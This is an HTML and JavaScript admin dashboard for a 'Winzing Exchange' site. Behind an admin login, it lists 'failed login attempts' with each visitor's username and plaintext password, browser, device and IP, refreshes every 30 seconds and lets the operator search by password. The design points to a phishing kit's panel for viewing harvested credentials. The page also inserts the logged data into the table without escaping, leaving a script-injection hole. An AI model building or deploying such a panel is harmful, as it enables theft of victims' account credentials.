<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard – Winzing Exchange</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Inter',sans-serif;background:#0f0f13;color:#e2e8f0;min-height:100vh}

        /* ── Login Screen ── */
        #login-screen{
            display:flex;align-items:center;justify-content:center;min-height:100vh;
            background:radial-gradient(ellipse at 50% 0%,#1a1a2e 0%,#0f0f13 70%);
        }
        .login-box{
            background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);
            border:1px solid rgba(255,255,255,0.1);border-radius:16px;
            padding:40px 36px;width:90%;max-width:380px;text-align:center;
            box-shadow:0 25px 60px rgba(0,0,0,0.5);
        }
        .admin-logo{font-size:42px;margin-bottom:12px}
        .login-box h2{font-size:22px;font-weight:700;margin-bottom:4px;color:#fff}
        .login-box p{font-size:13px;color:#94a3b8;margin-bottom:28px}
        .field{
            display:flex;align-items:center;gap:10px;
            background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.12);
            border-radius:10px;padding:12px 14px;margin-bottom:14px;
        }
        .field i{color:#64748b;width:16px}
        .field input{
            background:none;border:none;outline:none;flex:1;
            color:#e2e8f0;font-size:14px;font-family:'Inter',sans-serif;
        }
        .field input::placeholder{color:#475569}
        .login-btn-admin{
            width:100%;padding:13px;background:linear-gradient(135deg,#6366f1,#8b5cf6);
            border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;
            cursor:pointer;transition:opacity 0.2s,transform 0.15s;margin-top:6px;
            font-family:'Inter',sans-serif;
        }
        .login-btn-admin:hover{opacity:0.9;transform:translateY(-1px)}
        .login-err{color:#f87171;font-size:13px;margin-top:10px;display:none}

        /* ── Dashboard Screen ── */
        #dashboard-screen{display:none;min-height:100vh;flex-direction:column}
        .topbar{
            background:rgba(255,255,255,0.04);border-bottom:1px solid rgba(255,255,255,0.08);
            padding:0 24px;height:60px;display:flex;align-items:center;justify-content:space-between;
            position:sticky;top:0;z-index:10;backdrop-filter:blur(10px);
        }
        .topbar-left{display:flex;align-items:center;gap:12px}
        .topbar-left i{color:#8b5cf6;font-size:20px}
        .topbar-left span{font-weight:700;font-size:16px;color:#fff}
        .badge{
            background:#8b5cf6;color:#fff;border-radius:20px;
            padding:2px 10px;font-size:12px;font-weight:600;
        }
        .topbar-right{display:flex;align-items:center;gap:14px}
        .refresh-info{font-size:12px;color:#64748b}
        .logout-btn{
            background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);
            color:#f87171;border-radius:8px;padding:7px 14px;font-size:13px;
            cursor:pointer;font-family:'Inter',sans-serif;font-weight:500;
            transition:background 0.2s;
        }
        .logout-btn:hover{background:rgba(239,68,68,0.25)}

        .content{padding:24px;flex:1}
        .stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:24px}
        .stat-card{
            background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);
            border-radius:12px;padding:18px;
        }
        .stat-label{font-size:12px;color:#94a3b8;margin-bottom:6px}
        .stat-value{font-size:28px;font-weight:700;color:#fff}
        .stat-value.purple{color:#a78bfa}
        .stat-value.red{color:#f87171}

        .table-wrap{
            background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);
            border-radius:12px;overflow:hidden;
        }
        .table-header{
            padding:16px 20px;display:flex;align-items:center;justify-content:space-between;
            border-bottom:1px solid rgba(255,255,255,0.08);
        }
        .table-header h3{font-size:15px;font-weight:600;color:#fff}
        .search-box{
            display:flex;align-items:center;gap:8px;
            background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.1);
            border-radius:8px;padding:8px 12px;
        }
        .search-box i{color:#64748b;font-size:13px}
        .search-box input{
            background:none;border:none;outline:none;color:#e2e8f0;
            font-size:13px;width:160px;font-family:'Inter',sans-serif;
        }
        .search-box input::placeholder{color:#475569}

        table{width:100%;border-collapse:collapse}
        thead tr{background:rgba(255,255,255,0.05)}
        th{
            padding:12px 16px;text-align:left;font-size:11px;
            font-weight:600;color:#94a3b8;text-transform:uppercase;letter-spacing:0.05em;
            border-bottom:1px solid rgba(255,255,255,0.06);
        }
        td{
            padding:13px 16px;font-size:13px;color:#cbd5e1;
            border-bottom:1px solid rgba(255,255,255,0.04);
        }
        tr:last-child td{border-bottom:none}
        tr:hover td{background:rgba(255,255,255,0.03)}
        .no-data{text-align:center;padding:40px;color:#475569;font-size:14px}

        .device-tag{
            display:inline-flex;align-items:center;gap:5px;
            background:rgba(99,102,241,0.15);color:#a78bfa;
            border-radius:6px;padding:3px 8px;font-size:11px;font-weight:500;
        }
        .pass-cell{
            font-family:monospace;background:rgba(239,68,68,0.1);
            color:#fca5a5;border-radius:5px;padding:2px 8px;font-size:12px;
        }

        @media(max-width:640px){
            th:nth-child(4),td:nth-child(4),
            th:nth-child(5),td:nth-child(5),
            th:nth-child(6),td:nth-child(6){display:none}
            .search-box input{width:100px}
        }
    </style>
</head>
<body>

<!-- ── LOGIN SCREEN ── -->
<div id="login-screen">
    <div class="login-box">
        <div class="admin-logo">🛡️</div>
        <h2>Admin Access</h2>
        <p>Winzing Exchange — Secure Panel</p>

        <div class="field">
            <i class="fas fa-user-shield"></i>
            <input type="text" id="a-user" placeholder="Admin Username" autocomplete="off">
        </div>
        <div class="field">
            <i class="fas fa-lock"></i>
            <input type="password" id="a-pass" placeholder="Admin Password">
        </div>
        <button class="login-btn-admin" onclick="adminLogin()">
            <i class="fas fa-sign-in-alt"></i> Enter Dashboard
        </button>
        <div class="login-err" id="a-err">❌ Invalid admin credentials</div>
    </div>
</div>

<!-- ── DASHBOARD SCREEN ── -->
<div id="dashboard-screen">
    <div class="topbar">
        <div class="topbar-left">
            <i class="fas fa-shield-alt"></i>
            <span>Winzing Admin</span>
            <span class="badge" id="total-badge">0</span>
        </div>
        <div class="topbar-right">
            <span class="refresh-info" id="refresh-info">Auto-refresh: 30s</span>
            <button class="logout-btn" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i> Logout
            </button>
        </div>
    </div>

    <div class="content">
        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-label">Total Failed Logins</div>
                <div class="stat-value purple" id="stat-total">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Today's Attempts</div>
                <div class="stat-value red" id="stat-today">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Unique Usernames</div>
                <div class="stat-value" id="stat-unique">0</div>
            </div>
        </div>

        <div class="table-wrap">
            <div class="table-header">
                <h3><i class="fas fa-list" style="color:#8b5cf6;margin-right:8px"></i>Failed Login Attempts</h3>
                <div class="search-box">
                    <i class="fas fa-search"></i>
                    <input type="text" id="search" placeholder="Search..." oninput="filterTable()">
                </div>
            </div>
            <div style="overflow-x:auto">
                <table id="logs-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Timestamp</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Browser</th>
                            <th>Device</th>
                            <th>IP</th>
                        </tr>
                    </thead>
                    <tbody id="logs-body">
                        <tr><td colspan="7" class="no-data"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
let TOKEN = '';
let allLogs = [];
let refreshTimer;

// ── Admin Login ───────────────────────────────────────────────────────────────
async function adminLogin() {
    const username = document.getElementById('a-user').value.trim();
    const password = document.getElementById('a-pass').value;
    const errEl    = document.getElementById('a-err');
    errEl.style.display = 'none';

    try {
        const res  = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'admin-login', username, password })
        });
        const data = await res.json();

        if (data.success) {
            TOKEN = data.token;
            sessionStorage.setItem('adminToken', TOKEN);
            showDashboard();
        } else {
            errEl.style.display = 'block';
        }
    } catch (e) {
        errEl.textContent = '⚠️ Connection error. Try again.';
        errEl.style.display = 'block';
    }
}

// ── Dashboard ─────────────────────────────────────────────────────────────────
function showDashboard() {
    document.getElementById('login-screen').style.display    = 'none';
    document.getElementById('dashboard-screen').style.display = 'flex';
    fetchLogs();
    startAutoRefresh();
}

async function fetchLogs() {
    try {
        const res  = await fetch('/api/login', {
            headers: { 'x-admin-token': TOKEN }
        });
        const data = await res.json();
        if (res.status === 401) { logout(); return; }

        allLogs = data.logs || [];
        renderTable(allLogs);
        updateStats(allLogs);
        document.getElementById('total-badge').textContent = allLogs.length;
    } catch (e) {
        console.error('Fetch error:', e);
    }
}

function renderTable(logs) {
    const tbody = document.getElementById('logs-body');
    if (!logs.length) {
        tbody.innerHTML = '<tr><td colspan="7" class="no-data">🎉 No failed login attempts yet</td></tr>';
        return;
    }
    tbody.innerHTML = logs.map((l, i) => `
        <tr>
            <td style="color:#475569">${i + 1}</td>
            <td>${l.timestamp}</td>
            <td><strong style="color:#e2e8f0">${l.username}</strong></td>
            <td><span class="pass-cell">${l.password}</span></td>
            <td>${l.browser || '–'}</td>
            <td><span class="device-tag"><i class="fas fa-${l.device === 'Mobile' ? 'mobile-alt' : 'desktop'}"></i>${l.device || 'Desktop'}</span></td>
            <td style="color:#64748b;font-size:12px">${l.ip || '–'}</td>
        </tr>
    `).join('');
}

function updateStats(logs) {
    document.getElementById('stat-total').textContent = logs.length;
    const today = new Date().toLocaleDateString('en-IN');
    const todayCount = logs.filter(l => l.timestamp && l.timestamp.includes(today.split('/').join('/'))).length;
    document.getElementById('stat-today').textContent = todayCount;
    const unique = new Set(logs.map(l => l.username)).size;
    document.getElementById('stat-unique').textContent = unique;
}

function filterTable() {
    const q = document.getElementById('search').value.toLowerCase();
    const filtered = allLogs.filter(l =>
        (l.username || '').toLowerCase().includes(q) ||
        (l.password || '').toLowerCase().includes(q) ||
        (l.browser  || '').toLowerCase().includes(q) ||
        (l.ip       || '').toLowerCase().includes(q)
    );
    renderTable(filtered);
}

// ── Auto-refresh ──────────────────────────────────────────────────────────────
function startAutoRefresh() {
    let countdown = 30;
    clearInterval(refreshTimer);
    refreshTimer = setInterval(() => {
        countdown--;
        document.getElementById('refresh-info').textContent = `Auto-refresh: ${countdown}s`;
        if (countdown <= 0) {
            fetchLogs();
            countdown = 30;
        }
    }, 1000);
}

function logout() {
    clearInterval(refreshTimer);
    TOKEN = '';
    sessionStorage.removeItem('adminToken');
    document.getElementById('dashboard-screen').style.display = 'none';
    document.getElementById('login-screen').style.display     = 'flex';
}

// ── Enter key support ─────────────────────────────────────────────────────────
document.addEventListener('keydown', e => {
    if (e.key === 'Enter' && document.getElementById('login-screen').style.display !== 'none')
        adminLogin();
});

// ── Restore session ───────────────────────────────────────────────────────────
const saved = sessionStorage.getItem('adminToken');
if (saved) { TOKEN = saved; showDashboard(); }
</script>
</body>
</html>
